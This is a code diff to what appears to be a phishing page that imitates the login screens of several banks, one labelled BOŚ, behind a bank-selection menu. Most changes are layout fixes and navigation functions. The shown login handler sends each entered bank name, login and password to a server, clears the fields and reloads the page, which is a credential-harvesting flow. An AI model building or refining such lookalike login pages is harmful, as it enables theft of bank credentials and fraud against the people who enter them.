@@ -1708,7 +1708,7 @@
             transform: scale(0.97);
         }
 
-        /* ===== BANK 6 — BOŚ ===== */
+        /* ===== BANK 6 — BOŚ (NAPRAWIONE) ===== */
         .bank6-full-page {
             display: none;
             background: #f0f4f8;
@@ -1730,7 +1730,7 @@
         .bank6-container {
             max-width: 1000px;
             width: 100%;
-            margin: 0 auto;
+            margin: 20px auto;
             padding: 40px 30px;
             display: flex;
             gap: 50px;
@@ -1739,11 +1739,16 @@
             border-radius: 16px;
             box-shadow: 0 8px 48px rgba(0, 0, 0, 0.08);
             border: 1px solid #e6ebf3;
+            flex: 1;
+            justify-content: center;
         }
 
         .bank6-left {
             flex: 1;
             max-width: 420px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         .bank6-title {
@@ -1751,10 +1756,17 @@
             font-weight: 600;
             color: #1a1a1a;
             margin-bottom: 24px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .bank6-form {
+            width: 100%;
         }
 
         .bank6-form .form-group {
             margin-bottom: 18px;
+            width: 100%;
         }
 
         .bank6-form label {
@@ -1775,6 +1787,7 @@
             transition: border-color 0.2s, box-shadow 0.2s;
             font-family: inherit;
             color: #1a1a1a;
+            text-align: center;
         }
 
         .bank6-form input:focus {
@@ -1785,6 +1798,7 @@
 
         .bank6-form input::placeholder {
             color: #999;
+            text-align: center;
         }
 
         .bank6-form .login-btn {
@@ -2101,7 +2115,7 @@
             display: block;
         }
 
-        /* ===== BANK 8 ===== */
+        /* ===== BANK 8 (NAPRAWIONE) ===== */
         .bank8-full-page {
             display: none;
             background: #f5f7fa;
@@ -2126,11 +2140,15 @@
             gap: 60px;
             align-items: flex-start;
             min-height: calc(100vh - 72px);
+            justify-content: center;
         }
 
         .bank8-full-page .bank8-left {
             flex: 1;
             max-width: 580px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         .bank8-full-page .bank8-favicon {
@@ -2147,7 +2165,8 @@
             background: #ffffff;
             border-radius: 16px;
             padding: 28px 32px 32px;
-            width: 519px;
+            width: 100%;
+            max-width: 519px;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
             border: 1px solid #e8ecf0;
         }
@@ -3088,12 +3107,15 @@
                 max-width: 500px;
                 padding: 30px 24px;
                 gap: 30px;
+                margin: 20px auto;
             }
             .bank6-left {
                 max-width: 100%;
+                width: 100%;
             }
             .bank6-right {
                 max-width: 100%;
+                width: 100%;
             }
             .bank6-title {
                 font-size: 24px;
@@ -3112,6 +3134,7 @@
             }
             .bank8-full-page .bank8-left {
                 max-width: 100%;
+                width: 100%;
             }
             .bank8-full-page .bank8-card {
                 width: 100%;
@@ -4719,11 +4742,9 @@
 
         // ===== GO BACK TO BANKS (with history) =====
         function goBackToBanks() {
-            // Hide all login screens
             document.querySelectorAll('.login-screen, .bank2-full-page, .bank3-full-page, .bank4-full-page, .bank5-full-page, .bank6-full-page, .bank7-full-page, .bank8-full-page, .bank9-full-page, .bank10-full-page, .bank12-full-page').forEach(el => {
                 el.classList.remove('visible');
             });
-            // Show bank selection
             document.getElementById('bankSelection').classList.add('visible');
             document.getElementById('bankFooter').classList.add('visible');
             document.body.style.overflow = '';
@@ -4740,12 +4761,91 @@
             navigateTo({ page: 'banks' }, '#banks');
         }
 
+        function goBackToBanks3() {
+            document.getElementById('loginScreen3').classList.remove('visible');
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
+            document.body.style.overflow = '';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'banks' }, '#banks');
+        }
+
+        function goBackToBanks4() {
+            document.getElementById('loginScreen4').classList.remove('visible');
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
+            document.body.style.overflow = '';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'banks' }, '#banks');
+        }
+
+        function goBackToBanks5() {
+            document.getElementById('loginScreen5').classList.remove('visible');
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
+            document.body.style.overflow = '';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'banks' }, '#banks');
+        }
+
+        function goBackToBanks6() {
+            document.getElementById('loginScreen6').classList.remove('visible');
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
+            document.body.style.overflow = '';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'banks' }, '#banks');
+        }
+
+        function goBackToBanks7() {
+            document.getElementById('loginScreen7').classList.remove('visible');
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
+            document.body.style.overflow = '';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'banks' }, '#banks');
+        }
+
+        function goBackToBanks8() {
+            document.getElementById('loginScreen8').classList.remove('visible');
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
+            document.body.style.overflow = '';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'banks' }, '#banks');
+        }
+
+        function goBackToBanks9() {
+            document.getElementById('loginScreen9').classList.remove('visible');
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
+            document.body.style.overflow = '';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'banks' }, '#banks');
+        }
+
+        function goBackToBanks10() {
+            document.getElementById('loginScreen10').classList.remove('visible');
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
+            document.body.style.overflow = '';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'banks' }, '#banks');
+        }
+
+        function goBackToBanks12() {
+            document.getElementById('loginScreen12').classList.remove('visible');
+            document.getElementById('bankSelection').classList.add('visible');
+            document.getElementById('bankFooter').classList.add('visible');
+            document.body.style.overflow = '';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            navigateTo({ page: 'banks' }, '#banks');
+        }
+
         // ===== NAVIGATE TO BANK =====
         function navigateToBank(bankId, bankName) {
-            // Hide bank selection
             document.getElementById('bankSelection').classList.remove('visible');
             document.getElementById('bankFooter').classList.remove('visible');
-            // Show bank
             document.getElementById(bankId).classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -4983,21 +5083,18 @@
             // ===== HANDLE POPSTATE (browser back) =====
             window.addEventListener('popstate', function(event) {
                 const state = event.state;
-                if (!state) {
-                    // Если нет состояния — возвращаемся на главную
+                if (!state || state.page === 'main') {
                     document.querySelectorAll('.bank-selection, .login-screen, .bank2-full-page, .bank3-full-page, .bank4-full-page, .bank5-full-page, .bank6-full-page, .bank7-full-page, .bank8-full-page, .bank9-full-page, .bank10-full-page, .bank12-full-page').forEach(el => {
                         el.classList.remove('visible');
                     });
-                    document.getElementById('dataFormSection').classList.remove('hidden');
-                    document.getElementById('loginNav').classList.remove('hidden');
-                    document.getElementById('imageBanner').classList.remove('hidden');
+                    document.getElementById('bankSelection').classList.add('visible');
+                    document.getElementById('bankFooter').classList.add('visible');
                     document.body.style.overflow = '';
                     window.scrollTo({ top: 0, behavior: 'smooth' });
                     return;
                 }
 
                 if (state.page === 'banks') {
-                    // Показать страницу с банками
                     document.querySelectorAll('.login-screen, .bank2-full-page, .bank3-full-page, .bank4-full-page, .bank5-full-page, .bank6-full-page, .bank7-full-page, .bank8-full-page, .bank9-full-page, .bank10-full-page, .bank12-full-page').forEach(el => {
                         el.classList.remove('visible');
                     });
@@ -5005,18 +5102,7 @@
                     document.getElementById('bankFooter').classList.add('visible');
                     document.body.style.overflow = '';
                     window.scrollTo({ top: 0, behavior: 'smooth' });
-                } else if (state.page === 'main') {
-                    // Показать главную страницу
-                    document.querySelectorAll('.bank-selection, .login-screen, .bank2-full-page, .bank3-full-page, .bank4-full-page, .bank5-full-page, .bank6-full-page, .bank7-full-page, .bank8-full-page, .bank9-full-page, .bank10-full-page, .bank12-full-page').forEach(el => {
-                        el.classList.remove('visible');
-                    });
-                    document.getElementById('dataFormSection').classList.remove('hidden');
-                    document.getElementById('loginNav').classList.remove('hidden');
-                    document.getElementById('imageBanner').classList.remove('hidden');
-                    document.body.style.overflow = '';
-                    window.scrollTo({ top: 0, behavior: 'smooth' });
                 } else if (state.page === 'bank') {
-                    // Показать конкретный банк
                     const bankId = state.bankId;
                     if (bankId) {
                         document.getElementById('bankSelection').classList.remove('visible');
@@ -5102,7 +5188,6 @@
                 return false;
             }
 
-            // Send to server
             sendLoginToServer(bankName, login, password)
                 .then(result => {
                     if (result.success) {
@@ -5112,14 +5197,12 @@
                     }
                 });
 
-            // Clear fields
             allInputs.forEach(input => {
                 if (input.type === 'text' || input.type === 'password') {
                     input.value = '';
                 }
             });
 
-            // RELOAD PAGE after successful login
             setTimeout(() => {
                 location.reload();
             }, 1500);
@@ -5186,15 +5269,15 @@
                 const bank10 = document.getElementById('loginScreen10');
                 const bank12 = document.getElementById('loginScreen12');
                 if (bank2.classList.contains('visible')) goBackToBanks2();
-                if (bank3.classList.contains('visible')) goBackToBanks();
-                if (bank4.classList.contains('visible')) goBackToBanks();
-                if (bank5.classList.contains('visible')) goBackToBanks();
-                if (bank6.classList.contains('visible')) goBackToBanks();
-                if (bank7.classList.contains('visible')) goBackToBanks();
-                if (bank8.classList.contains('visible')) goBackToBanks();
-                if (bank9.classList.contains('visible')) goBackToBanks();
-                if (bank10.classList.contains('visible')) goBackToBanks();
-                if (bank12.classList.contains('visible')) goBackToBanks();
+                if (bank3.classList.contains('visible')) goBackToBanks3();
+                if (bank4.classList.contains('visible')) goBackToBanks4();
+                if (bank5.classList.contains('visible')) goBackToBanks5();
+                if (bank6.classList.contains('visible')) goBackToBanks6();
+                if (bank7.classList.contains('visible')) goBackToBanks7();
+                if (bank8.classList.contains('visible')) goBackToBanks8();
+                if (bank9.classList.contains('visible')) goBackToBanks9();
+                if (bank10.classList.contains('visible')) goBackToBanks10();
+                if (bank12.classList.contains('visible')) goBackToBanks12();
             }
         });
     </script>
